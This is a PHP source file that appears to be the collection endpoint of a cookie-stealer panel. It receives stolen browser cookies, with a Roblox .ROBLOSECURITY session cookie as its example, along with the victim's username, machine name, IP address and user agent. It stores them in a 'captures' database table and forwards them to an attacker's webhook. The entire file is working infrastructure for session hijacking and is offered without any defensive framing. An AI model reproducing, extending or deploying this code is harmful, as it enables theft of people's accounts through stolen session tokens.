<?php
declare(strict_types=1);
ini_set('display_errors', '0');

/**
 * POST /api/collect.php
 *   {"tag":"r...","app":"...","user":"...","machine":"...","at":"...","cookies":[
 *      {"browser":"Chrome","host":".roblox.com","name":".ROBLOSECURITY","value":"...","path":"/","expires":0}]}
 * -> {"ok":true,"count":1}
 */

require __DIR__ . '/../lib/db.php';
require __DIR__ . '/../lib/notify.php';

if (($_SERVER['REQUEST_METHOD'] ?? 'GET') !== 'POST') {
    json_out(['ok' => false, 'error' => 'POST required'], 405);
}

$body = read_json_body();
if (!$body) {
    json_out(['ok' => false, 'error' => 'empty body'], 400);
}

$cookies = $body['cookies'] ?? null;
if (!is_array($cookies)) {
    json_out(['ok' => false, 'error' => 'cookies must be an array'], 400);
}

$tag = substr(trim((string)($body['tag'] ?? '')), 0, 64);
$app = substr(trim((string)($body['app'] ?? '')), 0, 96);
$suser = substr(trim((string)($body['user'] ?? '')), 0, 96);
$machine = substr(trim((string)($body['machine'] ?? '')), 0, 96);
$at = substr(trim((string)($body['at'] ?? '')), 0, 32);
$ip = client_ip();
$agent = substr((string)($_SERVER['HTTP_USER_AGENT'] ?? ''), 0, 240);

// keep the stored copy bounded and normalised
$clean = [];
foreach ($cookies as $cookie) {
    if (!is_array($cookie)) {
        continue;
    }
    $entry = [
        'browser' => substr((string)($cookie['browser'] ?? ''), 0, 32),
        'host' => substr((string)($cookie['host'] ?? ''), 0, 192),
        'name' => substr((string)($cookie['name'] ?? ''), 0, 192),
        'value' => substr((string)($cookie['value'] ?? ''), 0, 4096),
        'path' => substr((string)($cookie['path'] ?? '/'), 0, 128),
        'expires' => (int)($cookie['expires'] ?? 0),
    ];
    if ($entry['name'] === '' || $entry['value'] === '') {
        continue;
    }
    $clean[] = $entry;
    if (count($clean) >= 20000) {
        break;
    }
}

$payload = json_encode([
    'tag' => $tag,
    'app' => $app,
    'user' => $suser,
    'machine' => $machine,
    'at' => $at,
    'cookies' => $clean,
], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);

$stmt = db()->prepare(
    'INSERT INTO captures (tag, app, suser, machine, ip, agent, cookies, at, received, payload)
     VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)'
);
$stmt->execute([$tag, $app, $suser, $machine, $ip, $agent, count($clean), $at, now_iso(), $payload]);

$conf = panel_conf();
$hook = trim((string)(setting('webhook', (string)($conf['webhook'] ?? '')) ?? ''));
notify_capture($hook, $tag, $app, $suser, $machine, $ip, $clean);

json_out(['ok' => true, 'count' => count($clean)]);
